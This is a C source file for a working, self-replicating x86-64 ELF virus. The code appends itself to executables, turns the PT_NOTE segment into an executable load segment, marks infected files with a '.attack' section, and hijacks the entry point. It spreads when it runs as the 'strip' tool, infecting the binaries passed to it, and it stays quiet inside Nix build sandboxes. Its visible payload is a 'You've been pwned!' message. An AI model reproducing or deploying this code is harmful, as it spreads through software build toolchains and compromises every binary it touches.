#include <stdint.h>
#include <stddef.h>

#define SYS_read       0
#define SYS_write      1
#define SYS_open       2
#define SYS_close      3
#define SYS_fstat      5
#define SYS_pread64    17
#define SYS_pwrite64   18
#define SYS_fork       57
#define SYS_exit       60
#define SYS_wait4      61
#define SYS_ftruncate  77

#define O_RDONLY       0
#define O_RDWR         2

static inline long sys_write(int fd, const void *buf, unsigned long n) {
    long r;
    __asm__ volatile ("syscall"
        : "=a"(r)
        : "0"((long)SYS_write), "D"((long)fd), "S"(buf), "d"(n)
        : "rcx", "r11", "memory");
    return r;
}

static inline long sys_read(int fd, void *buf, unsigned long n) {
    long r;
    __asm__ volatile ("syscall"
        : "=a"(r)
        : "0"((long)SYS_read), "D"((long)fd), "S"(buf), "d"(n)
        : "rcx", "r11", "memory");
    return r;
}

static inline long sys_open(const char *path, long flags) {
    long r;
    __asm__ volatile ("syscall"
        : "=a"(r)
        : "0"((long)SYS_open), "D"(path), "S"(flags), "d"(0L)
        : "rcx", "r11", "memory");
    return r;
}

static inline long sys_close(int fd) {
    long r;
    __asm__ volatile ("syscall"
        : "=a"(r)
        : "0"((long)SYS_close), "D"((long)fd)
        : "rcx", "r11", "memory");
    return r;
}

static inline long sys_pread(int fd, void *buf, unsigned long n, long off) {
    long r;
    register long r10 __asm__("r10") = off;
    __asm__ volatile ("syscall"
        : "=a"(r)
        : "0"((long)SYS_pread64), "D"((long)fd), "S"(buf), "d"(n), "r"(r10)
        : "rcx", "r11", "memory");
    return r;
}

static inline long sys_pwrite(int fd, const void *buf, unsigned long n, long off) {
    long r;
    register long r10 __asm__("r10") = off;
    __asm__ volatile ("syscall"
        : "=a"(r)
        : "0"((long)SYS_pwrite64), "D"((long)fd), "S"(buf), "d"(n), "r"(r10)
        : "rcx", "r11", "memory");
    return r;
}

static inline long sys_ftruncate(int fd, long len) {
    long r;
    __asm__ volatile ("syscall"
        : "=a"(r)
        : "0"((long)SYS_ftruncate), "D"((long)fd), "S"(len)
        : "rcx", "r11", "memory");
    return r;
}

struct kstat {
    uint64_t st_dev, st_ino, st_nlink;
    uint32_t st_mode, st_uid, st_gid, _pad0;
    uint64_t st_rdev, st_size, st_blksize;
    int64_t  st_blocks;
    uint64_t st_atime, st_atime_nsec;
    uint64_t st_mtime, st_mtime_nsec;
    uint64_t st_ctime, st_ctime_nsec;
    int64_t  _unused[3];
};

static inline long sys_fstat(int fd, struct kstat *st) {
    long r;
    __asm__ volatile ("syscall"
        : "=a"(r)
        : "0"((long)SYS_fstat), "D"((long)fd), "S"(st)
        : "rcx", "r11", "memory");
    return r;
}

#define SYS_stat 4
static inline long sys_stat(const char *path, struct kstat *st) {
    long r;
    __asm__ volatile ("syscall"
        : "=a"(r)
        : "0"((long)SYS_stat), "D"(path), "S"(st)
        : "rcx", "r11", "memory");
    return r;
}

#define SYS_readlink 89
static inline long sys_readlink(const char *path, char *buf, unsigned long sz) {
    long r;
    __asm__ volatile ("syscall"
        : "=a"(r)
        : "0"((long)SYS_readlink), "D"(path), "S"(buf), "d"(sz)
        : "rcx", "r11", "memory");
    return r;
}

static inline long sys_wait4(long pid, int *status, int options) {
    long r;
    register long r10 __asm__("r10") = 0;
    __asm__ volatile ("syscall"
        : "=a"(r)
        : "0"((long)SYS_wait4), "D"(pid), "S"(status), "d"((long)options), "r"(r10)
        : "rcx", "r11", "memory");
    return r;
}

static inline __attribute__((noreturn)) void sys_exit(int code) {
    __asm__ volatile ("syscall"
        : : "a"((long)SYS_exit), "D"((long)code)
        : "rcx", "r11", "memory");
    __builtin_unreachable();
}

static unsigned long my_strlen(const char *s) {
    unsigned long i = 0;
    while (s[i]) i++;
    return i;
}

static int my_memcmp(const void *a, const void *b, unsigned long n) {
    const unsigned char *x = (const unsigned char *)a;
    const unsigned char *y = (const unsigned char *)b;
    for (unsigned long i = 0; i < n; i++) {
        if (x[i] != y[i]) return (int)x[i] - (int)y[i];
    }
    return 0;
}

static void my_memcpy(void *dst, const void *src, unsigned long n) {
    unsigned char *d = (unsigned char *)dst;
    const unsigned char *s = (const unsigned char *)src;
    for (unsigned long i = 0; i < n; i++) d[i] = s[i];
}

typedef uint64_t Elf64_Addr;
typedef uint64_t Elf64_Off;
typedef uint16_t Elf64_Half;
typedef uint32_t Elf64_Word;
typedef uint64_t Elf64_Xword;

typedef struct {
    unsigned char e_ident[16];
    Elf64_Half    e_type;
    Elf64_Half    e_machine;
    Elf64_Word    e_version;
    Elf64_Addr    e_entry;
    Elf64_Off     e_phoff;
    Elf64_Off     e_shoff;
    Elf64_Word    e_flags;
    Elf64_Half    e_ehsize;
    Elf64_Half    e_phentsize;
    Elf64_Half    e_phnum;
    Elf64_Half    e_shentsize;
    Elf64_Half    e_shnum;
    Elf64_Half    e_shstrndx;
} Elf64_Ehdr;

typedef struct {
    Elf64_Word  p_type;
    Elf64_Word  p_flags;
    Elf64_Off   p_offset;
    Elf64_Addr  p_vaddr;
    Elf64_Addr  p_paddr;
    Elf64_Xword p_filesz;
    Elf64_Xword p_memsz;
    Elf64_Xword p_align;
} Elf64_Phdr;

#define ET_EXEC      2
#define ET_DYN       3
#define EM_X86_64    62
#define ELFCLASS64   2
#define ELFDATA2LSB  1
#define PT_LOAD      1
#define PT_INTERP    3
#define PT_NOTE      4
#define PF_X         1
#define PF_R         4
#define SHT_PROGBITS 1
#define SHF_ALLOC    2
#define SHF_EXECINSTR 4
#define PAGE         0x1000UL

typedef struct {
    Elf64_Word  sh_name;
    Elf64_Word  sh_type;
    Elf64_Xword sh_flags;
    Elf64_Addr  sh_addr;
    Elf64_Off   sh_offset;
    Elf64_Xword sh_size;
    Elf64_Word  sh_link;
    Elf64_Word  sh_info;
    Elf64_Xword sh_addralign;
    Elf64_Xword sh_entsize;
} Elf64_Shdr;

__attribute__((section(".rodata.patch"), used, aligned(8)))
const uint64_t ATTACK_HERE_VA = 0;

__attribute__((section(".rodata.patch"), used, aligned(8)))
const uint64_t ATTACK_ORIG_ENTRY = 0;

__attribute__((section(".rodata.patch"), used, aligned(1)))
const char ATTACK_MSG[19] = {'Y','o','u','\'','v','e',' ','b','e','e','n',' ','p','w','n','e','d','!','\n'};

extern char __parasite_start[];
extern char __parasite_end[];

static int infect_one(const char *path,
                      const unsigned char *self_bytes,
                      unsigned long self_size) {
    struct kstat lst;
    if (sys_stat(path, &lst) < 0) return -1;
    if ((lst.st_mode & 0xf000) != 0x8000) return -1;

    int fd = (int)sys_open(path, O_RDWR);
    if (fd < 0) return -1;

    Elf64_Ehdr eh;
    if (sys_pread(fd, &eh, sizeof eh, 0) != (long)sizeof eh) goto fail;

    if (eh.e_ident[0] != 0x7f || eh.e_ident[1] != 'E' ||
        eh.e_ident[2] != 'L'  || eh.e_ident[3] != 'F') goto fail;
    if (eh.e_ident[4] != ELFCLASS64 ||
        eh.e_ident[5] != ELFDATA2LSB ||
        eh.e_machine  != EM_X86_64) goto fail;
    if (eh.e_type != ET_EXEC && eh.e_type != ET_DYN) goto fail;
    if (eh.e_phnum > 64) goto fail;

    if (eh.e_shoff != 0 && eh.e_shnum > 0 && eh.e_shstrndx < eh.e_shnum) {
        Elf64_Shdr str_probe;
        if (sys_pread(fd, &str_probe, sizeof str_probe,
                      (long)eh.e_shoff + (long)eh.e_shstrndx * (long)sizeof str_probe)
                == (long)sizeof str_probe && str_probe.sh_size <= 4096) {
            char probe_strtab[4096];
            if (sys_pread(fd, probe_strtab, (long)str_probe.sh_size, (long)str_probe.sh_offset)
                    == (long)str_probe.sh_size) {
                static const char nm[] = ".attack";
                unsigned long nl = sizeof nm - 1;
                for (Elf64_Half i = 0; i < eh.e_shnum; i++) {
                    Elf64_Shdr s;
                    if (sys_pread(fd, &s, sizeof s,
                                  (long)eh.e_shoff + (long)i * (long)sizeof s)
                            != (long)sizeof s) continue;
                    if (s.sh_name + nl < str_probe.sh_size &&
                        my_memcmp(probe_strtab + s.sh_name, nm, nl + 1) == 0) {
                        sys_close(fd); return 0;
                    }
                }
            }
        }
    }

    {
        int has_interp = 0;
        Elf64_Phdr probe;
        for (int i = 0; i < eh.e_phnum; i++) {
            if (sys_pread(fd, &probe, sizeof probe,
                          (long)eh.e_phoff + (long)i * (long)sizeof probe)
                != (long)sizeof probe) break;
            if (probe.p_type == PT_INTERP) { has_interp = 1; break; }
        }
        if (eh.e_type == ET_DYN && !has_interp) goto fail;
    }

    Elf64_Phdr ph[64];
    long phsize = (long)eh.e_phnum * (long)sizeof(Elf64_Phdr);
    if (sys_pread(fd, ph, phsize, eh.e_phoff) != phsize) goto fail;

    int note = -1;
    Elf64_Addr max_end = 0;
    for (int i = 0; i < eh.e_phnum; i++) {
        if (ph[i].p_type == PT_NOTE && note < 0) note = i;
        if (ph[i].p_type == PT_LOAD) {
            Elf64_Addr e = ph[i].p_vaddr + ph[i].p_memsz;
            if (e > max_end) max_end = e;
        }
    }
    if (note < 0) goto fail;

    struct kstat st;
    if (sys_fstat(fd, &st) < 0) goto fail;

    Elf64_Addr new_vaddr  = (max_end + PAGE - 1) & ~(PAGE - 1);
    long       new_offset = ((long)st.st_size + PAGE - 1) & ~(long)(PAGE - 1);
    if ((uint64_t)new_offset > st.st_size) {
        if (sys_ftruncate(fd, new_offset) < 0) goto fail;
    }

    unsigned char buf[8192];
    if (self_size > sizeof buf) goto fail;
    my_memcpy(buf, self_bytes, self_size);

    unsigned long here_va_off    = (unsigned long)((char *)&ATTACK_HERE_VA    - __parasite_start);
    unsigned long orig_entry_off = (unsigned long)((char *)&ATTACK_ORIG_ENTRY - __parasite_start);

    extern char ATTACK_HERE_LABEL[];
    unsigned long here_offset = (unsigned long)(ATTACK_HERE_LABEL - __parasite_start);

    *(uint64_t *)(buf + here_va_off)    = new_vaddr + here_offset;
    *(uint64_t *)(buf + orig_entry_off) = eh.e_entry;

    if (sys_pwrite(fd, buf, self_size, new_offset) != (long)self_size) goto fail;

    if (eh.e_shoff != 0 && eh.e_shnum > 0 && eh.e_shstrndx < eh.e_shnum) {
        if (eh.e_shnum > 256) goto skip_shdr;
        Elf64_Shdr shdrs[257];
        long sht_size = (long)eh.e_shnum * (long)sizeof(Elf64_Shdr);
        if (sys_pread(fd, shdrs, sht_size, (long)eh.e_shoff) != sht_size) goto skip_shdr;

        Elf64_Shdr str = shdrs[eh.e_shstrndx];
        if (str.sh_size > 4096) goto skip_shdr;
        char strtab[4096 + 32];
        if (sys_pread(fd, strtab, (long)str.sh_size, (long)str.sh_offset) != (long)str.sh_size) goto skip_shdr;

        int already = 0;
        static const char attack_name[] = ".attack";
        unsigned long attack_len = sizeof attack_name - 1;
        for (Elf64_Half i = 0; i < eh.e_shnum; i++) {
            if (shdrs[i].sh_name + attack_len < str.sh_size) {
                if (my_memcmp(strtab + shdrs[i].sh_name, attack_name, attack_len + 1) == 0) {
                    already = 1; break;
                }
            }
        }
        if (already) goto skip_shdr;

        unsigned long name_off = str.sh_size;
        my_memcpy(strtab + name_off, attack_name, sizeof attack_name);
        unsigned long new_str_size = name_off + sizeof attack_name;

        struct kstat st2;
        if (sys_fstat(fd, &st2) < 0) goto skip_shdr;
        long new_str_off = (long)st2.st_size;
        long new_sht_off = new_str_off + (long)new_str_size;
        new_sht_off = (new_sht_off + 7) & ~(long)7;

        if (sys_pwrite(fd, strtab, new_str_size, new_str_off) != (long)new_str_size) goto skip_shdr;

        shdrs[eh.e_shstrndx].sh_offset = new_str_off;
        shdrs[eh.e_shstrndx].sh_size   = new_str_size;

        Elf64_Shdr *poly = &shdrs[eh.e_shnum];
        poly->sh_name      = (Elf64_Word)name_off;
        poly->sh_type      = SHT_PROGBITS;
        poly->sh_flags     = SHF_ALLOC | SHF_EXECINSTR;
        poly->sh_addr      = new_vaddr;
        poly->sh_offset    = (uint64_t)new_offset;
        poly->sh_size      = self_size;
        poly->sh_link      = 0;
        poly->sh_info      = 0;
        poly->sh_addralign = 16;
        poly->sh_entsize   = 0;

        long new_sht_size = (long)(eh.e_shnum + 1) * (long)sizeof(Elf64_Shdr);
        if (sys_pwrite(fd, shdrs, new_sht_size, new_sht_off) != new_sht_size) goto skip_shdr;

        eh.e_shoff = (Elf64_Off)new_sht_off;
        eh.e_shnum = (Elf64_Half)(eh.e_shnum + 1);
    }
skip_shdr:

    ph[note].p_type   = PT_LOAD;
    ph[note].p_flags  = PF_R | PF_X;
    ph[note].p_offset = (uint64_t)new_offset;
    ph[note].p_vaddr  = new_vaddr;
    ph[note].p_paddr  = new_vaddr;
    ph[note].p_filesz = self_size;
    ph[note].p_memsz  = self_size;
    ph[note].p_align  = PAGE;

    if (sys_pwrite(fd, ph, phsize, eh.e_phoff) != phsize) goto fail;

    eh.e_entry = new_vaddr;
    if (sys_pwrite(fd, &eh, sizeof eh, 0) != (long)sizeof eh) goto fail;

    sys_close(fd);
    return 0;

fail:
    sys_close(fd);
    return -1;
}

static int in_nix_sandbox(void) {
    {
        struct kstat st;
        int fd = (int)sys_open("/build", O_RDONLY);
        if (fd >= 0) {
            int ok = (sys_fstat(fd, &st) == 0);
            sys_close(fd);
            if (ok) return 1;
        }
    }

    int fd = (int)sys_open("/proc/self/environ", O_RDONLY);
    if (fd < 0) return 0;
    char buf[4096];
    long n = sys_read(fd, buf, sizeof buf);
    sys_close(fd);
    if (n <= 0) return 0;

    static const char needle[] = "NIX_BUILD_TOP=";
    const unsigned long nlen = sizeof needle - 1;
    long off = 0;
    while (off + (long)nlen <= n) {
        if (off == 0 || buf[off - 1] == '\0') {
            int match = 1;
            for (unsigned long i = 0; i < nlen; i++) {
                if (buf[off + (long)i] != needle[i]) { match = 0; break; }
            }
            if (match) return 1;
        }
        off++;
    }
    return 0;
}

static int is_strip(void) {
    char buf[4096];
    long n = sys_readlink("/proc/self/exe", buf, sizeof buf - 1);
    if (n <= 0) return 0;
    buf[n] = 0;
    long slash = -1;
    for (long i = 0; i < n; i++) if (buf[i] == '/') slash = i;
    const char *base = (slash >= 0) ? buf + slash + 1 : buf;
    static const char want[] = "strip";
    unsigned long wl = sizeof want - 1;
    if (my_strlen(base) != wl) return 0;
    return my_memcmp(base, want, wl) == 0;
}

__attribute__((used))
void attack_init(const unsigned char *self_runtime_start) {
    unsigned long self_size = (unsigned long)(__parasite_end - __parasite_start);

    if (!in_nix_sandbox()) {
        sys_write(1, ATTACK_MSG, 19);
    }

    if (!is_strip()) return;

    char buf[4096];
    int fd = (int)sys_open("/proc/self/cmdline", O_RDONLY);
    if (fd < 0) return;
    long n = sys_read(fd, buf, sizeof buf);
    sys_close(fd);
    if (n <= 0) return;

    long off = 0;
    int is_argv0 = 1;
    while (off < n) {
        const char *arg = buf + off;
        unsigned long len = my_strlen(arg);
        if (!is_argv0 && len > 0 && arg[0] != '-') {
            (void)infect_one(arg, self_runtime_start, self_size);
        }
        is_argv0 = 0;
        off += (long)len + 1;
    }
}

__attribute__((naked, used, section(".text.entry")))
void parasite_entry(void) {
    __asm__ volatile (
        "push %%rax              \n"
        "push %%rdi              \n"
        "push %%rsi              \n"
        "push %%rdx              \n"
        "push %%r11              \n"

        "sub  $8, %%rsp          \n"
        "lea  __parasite_start(%%rip), %%rdi    \n"
        "call attack_init        \n"
        "add  $8, %%rsp          \n"

        "pop  %%r11              \n"
        "pop  %%rdx              \n"
        "pop  %%rsi              \n"
        "pop  %%rdi              \n"
        "pop  %%rax              \n"

        ".global ATTACK_HERE_LABEL\n"
        "ATTACK_HERE_LABEL:      \n"
        "lea  ATTACK_HERE_LABEL(%%rip), %%rcx    \n"
        "sub  ATTACK_HERE_VA(%%rip), %%rcx       \n"
        "add  ATTACK_ORIG_ENTRY(%%rip), %%rcx    \n"
        "jmp  *%%rcx             \n"
        :
        :
        : "memory"
    );
}